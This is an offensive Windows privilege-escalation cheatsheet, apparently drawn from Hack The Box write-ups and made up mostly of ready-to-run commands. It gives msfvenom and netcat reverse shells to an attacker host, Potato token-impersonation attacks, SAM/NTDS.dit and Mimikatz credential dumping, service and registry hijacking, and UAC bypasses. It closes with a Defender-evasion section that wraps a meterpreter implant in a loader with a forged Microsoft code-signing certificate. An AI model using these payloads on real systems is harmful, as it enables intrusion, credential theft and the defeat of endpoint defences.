---
title: "Windows Privilege Escalation Cheatsheet"
type: cheatsheet
tags: [cheatsheet, credentials, htb, potato, privilege-escalation, service-exploitation, token-impersonation, uac-bypass, windows]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [git-htb-writeups]
---

# Windows Privilege Escalation Cheatsheet

---

## Quick Wins

```powershell
# 1. Check privileges
whoami /priv
# SeImpersonatePrivilege -> Potato attacks
# SeBackupPrivilege -> Read any file (SAM/SYSTEM/NTDS.dit)
# SeRestorePrivilege -> Write any file
# SeTakeOwnershipPrivilege -> Take ownership of any object

# 2. Stored credentials
cmdkey /list
runas /savecred /user:administrator cmd.exe

# 3. AlwaysInstallElevated (both keys must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi

# 4. AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# 5. Unattend files
dir /s /b C:\unattend.xml C:\sysprep.xml C:\sysprep.inf 2>nul
```

---

## Token Impersonation — Potato Attacks

Requires `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. Found on service accounts (IIS, MSSQL, etc).

```powershell
# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -c "C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe"

# GodPotato (Windows 8–11, Server 2012–2022)
.\GodPotato.exe -cmd "C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe"

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a "10.10.14.X 4444 -e cmd.exe"

# SweetPotato
.\SweetPotato.exe -p C:\temp\nc.exe -a "10.10.14.X 4444 -e cmd.exe"

# RoguePotato
.\RoguePotato.exe -r 10.10.14.X -e "cmd.exe /c C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe" -l 9999
```

---

## SeBackupPrivilege — Read Any File

```powershell
# Dump SAM/SYSTEM/SECURITY (any local account)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Read protected file via robocopy
robocopy /b C:\Users\Administrator\Desktop C:\temp flag.txt

# Dump NTDS.dit via diskshadow + robocopy
# 1. Create script.txt:
#    set context persistent nowriters
#    add volume c: alias mydrive
#    create
#    expose %mydrive% z:
diskshadow /s C:\temp\script.txt
robocopy /b z:\Windows\NTDS C:\temp NTDS.dit
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Parse offline on attacker
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## Service Exploitation

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Find weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Modify service binary path
sc config VulnService binpath= "C:\temp\nc.exe 10.10.14.X 4444 -e cmd.exe"
sc stop VulnService
sc start VulnService

# Writable service binary — replace binary with payload
copy C:\temp\shell.exe "C:\Program Files\VulnService\service.exe"
sc stop VulnService
sc start VulnService

# DLL hijacking — find missing DLLs with Process Monitor
# Place malicious DLL in writable dir in service PATH
```

---

## Registry Exploitation

```powershell
# Writable service registry key
reg query HKLM\System\CurrentControlSet\Services\VulnService
# If writable, change ImagePath:
reg add HKLM\System\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe"

# AutoRun programs in writable locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

---

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# Eventvwr bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# UACME — large collection of UAC bypass methods
.\Akagi64.exe <method_id> cmd.exe
```

---

## Scheduled Tasks

```powershell
# List all scheduled tasks with detail
schtasks /query /fo LIST /v

# Find SYSTEM tasks with writable binaries
schtasks /query /fo LIST /v | findstr /i "Run As User" | findstr /i "SYSTEM"
icacls "C:\Path\To\Task\Binary.exe"
```

---

## Credential Harvesting

```powershell
# Mimikatz — dump everything
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# lsadump::secrets

# DPAPI — Chrome passwords
mimikatz# dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Credential Vault
mimikatz# vault::cred
mimikatz# vault::list

# WDigest (enable and wait for re-login)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

---

## Automated Tools

```powershell
# WinPEAS — comprehensive automated enumeration
.\winPEASx64.exe

# PowerUp — service and config checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — security posture check
.\Seatbelt.exe -group=all -full

# SharpUp — PowerUp in C#
.\SharpUp.exe audit

# PrivescCheck — extended checks with HTML report
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report PrivescCheck_Report -Format HTML
```

---

## Quick Checklist

```
1. whoami /priv         — SeImpersonate? → Potato attack
2. cmdkey /list         — Saved credentials?
3. reg AutoLogon        — Cleartext password?
4. AlwaysInstallElevated both keys?
5. Unquoted service paths (wmic service get)
6. Weak service permissions (accesschk)
7. Writable service binary paths
8. Writable registry keys for services/autorun
9. DLL hijacking via Process Monitor
10. Scheduled tasks with writable binaries
11. SeBackupPrivilege → SAM/NTDS.dit dump
12. Kernel exploits (last resort — check with WinPEAS)
```

## See Also

- [[uac-bypass]] — UAC bypass technique details
- [[pass-the-hash]] — credential reuse after dump
- [[ad-lateral-movement]] — moving with harvested creds
- [[ad-cheatsheet|Active Directory cheatsheet]]

## Potato attacks vs Defender/EDR — solve evasion ONCE, at the loader

When you hold `SeImpersonatePrivilege` (IIS/MSSQL service account) but **Windows Defender signatures every potato binary** — GodPotato/PrintSpoofer/JuicyPotato/SigmaPotato all flagged on-disk, offline-obfuscated rebuilds still caught, in-memory execution hangs on the DCOM/RPC trigger, on-box compile trips AV — **stop fighting AV once per artifact.** That is the trap: each standalone `.exe` is a separate signature battle you keep losing.

**Fix: get an EDR-evading in-memory C2 session first, then invoke the impersonation primitive from inside that already-clean process.** No new signatured binary touches disk and there is no standalone trigger EXE to flag. Solve Defender ONCE (at the implant) and every subsequent in-memory action rides along.

```bash
# 1. raw x64 meterpreter shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f raw -o implant.bin
# 2. wrap with ScareCrow (forges a code-signing cert impersonating -domain); rename output benign
./ScareCrow -I implant.bin -domain Microsoft.com     # e.g. -> Outlook.exe
```
```
# 3. attacker: multi/handler for windows/x64/meterpreter/reverse_tcp
# 4. RUN THE LOADER FROM THE SeImpersonate SHELL (the service/app-pool identity), NOT a low-priv
#    interactive user — getsystem's named-pipe impersonation needs that token, or it has nothing
#    to impersonate. Often FAILS the first run — just re-run.
meterpreter > getsystem      # Technique 1/2 = named-pipe impersonation = the SAME "potato", in-memory
meterpreter > load kiwi      # mimikatz in SYSTEM context -> dump hashes
```

Key facts:
- **Change the DELIVERY, not the primitive.** `getsystem` *is* a potato (it consumes `SeImpersonate`); the only difference from a flagged `GodPotato.exe` is that it runs inside a Defender-clean process and drops nothing.
- **[[scarecrow|ScareCrow]]** = shellcode-into-loader wrapper with a fake code-signing cert (`-domain <fqdn>`), AMSI+ETW patch, encrypted shellcode; static + basic behavioral Defender evasion for the *loader* stage (full page: [[scarecrow]]). Alternatives: Donut, Sliver's stager, `execute-assembly` from an existing clean session.
- **SigmaPotato** is a GodPotato fork built for in-memory use (`.NET` reflective load via `execute-assembly`) — better than a dropped `.exe`, but the in-memory DCOM trigger can still hang; the loader-first approach above is more reliable when it does.
- **Egress-restricted host:** fingerprint allowed OUTBOUND ports before choosing C2 ports (common survivors 53/80/443/445). Stage the loader over one (`python3 -m http.server 445`), catch the callback on another (`multi/handler` on 53).
- **When a C2 loader is not an option:** fresh **non-potato** local-EoP source PoCs compiled offline carry no AV signature (Nightmare_Eclipse / churchofmalware.org: **MiniPlasma** = weaponized *unpatched* CVE-2020-17103 `cldflt` HsmOsBlockPlaceholderAccess race -> SYSTEM, claims all Windows incl. Server; **RedSun** = Defender file-rewrite -> system-file overwrite -> admin; **LegacyHive** = arbitrary hive-load EoP, needs a second std-user cred). All race-based/hit-or-miss; unofficial exploit code, compile and detonate in a lab first. Note `UnDefend` only blocks *future* signature updates — it will NOT un-flag an already-signatured binary.

See also [[scarecrow]] · [[privesc-exploit-arsenal]] · [[windows-amsi-bypass]] · [[endpoint-detection-and-response]] · [[peass]] (winPEAS-vs-Defender).

<!-- promoted-slug: seimpersonate-defender-evasion-loader -->
